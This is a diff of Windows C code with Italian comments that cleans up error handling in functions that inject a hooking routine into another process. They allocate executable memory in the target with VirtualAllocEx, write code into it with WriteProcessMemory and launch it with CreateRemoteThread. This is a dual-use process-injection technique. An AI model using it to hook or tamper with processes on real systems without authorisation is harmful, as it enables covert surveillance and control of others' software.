@@ -185,44 +185,37 @@ DWORD HookingThread(HookingThreadDataStruct *pDataThread)
 	return 1;
 }
 
+#define SET_IF_VALID(x, value) if (x) *x = value
+
 // Alloca codice e dati in un processo target
 void *InjectCode(DWORD pid, BYTE *hook_add, DWORD hook_size, BYTE *data_add, DWORD data_size, BYTE **rha, BYTE **rda) 
 {
-	HANDLE h_process;
+	HANDLE hProcess = NULL;
 	SIZE_T dummy;
-	DWORD call_offs;
-	BYTE *search_ptr;
-	BYTE *remote_hook_add;
-	BYTE *remote_data_add;
+	BYTE *remote_hook_add = NULL;
+	BYTE *remote_data_add = NULL;
 
-	if (rha)
-		*rha = NULL;
-	if (rda)
-		*rda = NULL;
+	do {
+		if ((hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid)) == NULL)
+			break;
 
-	if((h_process = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid)) == NULL)
-		return NULL;
+		remote_hook_add = (BYTE*)VirtualAllocEx(hProcess, 0, hook_size, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+		remote_data_add = (BYTE*)VirtualAllocEx(hProcess, 0, data_size, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
 
-	remote_hook_add = (BYTE *)VirtualAllocEx(h_process, 0, hook_size, MEM_COMMIT, PAGE_EXECUTE_READWRITE );
-	remote_data_add = (BYTE *)VirtualAllocEx(h_process, 0, data_size, MEM_COMMIT, PAGE_EXECUTE_READWRITE );
+		if (!remote_hook_add || !remote_data_add)
+			break;
 
-	if (!remote_hook_add || !remote_data_add) {
-		CloseHandle(h_process);
-		return NULL;
-	}
-		
-	if (!WriteProcessMemory(h_process, remote_hook_add, hook_add, hook_size, &dummy) ||
-		!WriteProcessMemory(h_process, remote_data_add, data_add, data_size, &dummy) ) {
-		CloseHandle(h_process);
-		return NULL;
-	}
+		if (!WriteProcessMemory(hProcess, remote_hook_add, hook_add, hook_size, &dummy) ||
+			!WriteProcessMemory(hProcess, remote_data_add, data_add, data_size, &dummy)) {
+			break;
+		}
+	} while (0);
 
-	CloseHandle(h_process);
+	if (hProcess != NULL)
+		CloseHandle(hProcess);
 
-	if (rha)
-		*rha = remote_hook_add;
-	if (rda)
-		*rda = remote_data_add;
+	SET_IF_VALID(rha, remote_hook_add);
+	SET_IF_VALID(rda, remote_data_add);
 
 	return remote_hook_add;
 }
@@ -230,33 +223,38 @@ void *InjectCode(DWORD pid, BYTE *hook_add, DWORD hook_size, BYTE *data_add, DWO
 // Lancia il thread di hooking nel processo target
 BOOL StartHookingThread(DWORD pid)
 {
-	HANDLE h_thread, h_process;
+	HANDLE hThread = NULL, hProcess = NULL;
 	LPTHREAD_START_ROUTINE p_remote_func;
 	void *p_remote_data;
 	DWORD dummy;
 	HookingThreadDataStruct HookingThreadData;
 
-	// Hooka i processi una sola volta
-	if (!MarkProcess(pid))
-		return FALSE;	
+	do {
+		// Hooka i processi una sola volta
+		if (!MarkProcess(pid))
+			break;
 
-	if(!HookingThreadSetup(&HookingThreadData))
-		return FALSE;
+		if (!HookingThreadSetup(&HookingThreadData))
+			break;
 
-	if (!InjectCode(pid, (BYTE *)HookingThread, 500, (BYTE *)&HookingThreadData, sizeof(HookingThreadData), (BYTE **)&p_remote_func, (BYTE **)&p_remote_data))
-		return FALSE;
+		if (!InjectCode(pid, (BYTE*)HookingThread, 500, (BYTE*)&HookingThreadData, sizeof(HookingThreadData), (BYTE**)&p_remote_func, (BYTE**)&p_remote_data))
+			break;
 
-	// Esegue il thread di hooking
-	if (! (h_process = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid)) )
-		return FALSE;
+		// Esegue il thread di hooking
+		if (!(hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid)))
+			break;
 
-	h_thread = CreateRemoteThread(h_process, NULL, 8192, p_remote_func, p_remote_data, 0, &dummy);
-	CloseHandle(h_process);
-	if(!h_thread)
-		return FALSE;		
+		hThread = CreateRemoteThread(hProcess, NULL, 8192, p_remote_func, p_remote_data, 0, &dummy);
+	} while (0);
 
-	CloseHandle(h_thread);
-	return TRUE;
+	
+	if (hProcess != NULL)
+		CloseHandle(hProcess);
+
+	if (hThread != NULL)
+		CloseHandle(hThread);
+
+	return (hThread != NULL);
 }
 
 // Hooka un API
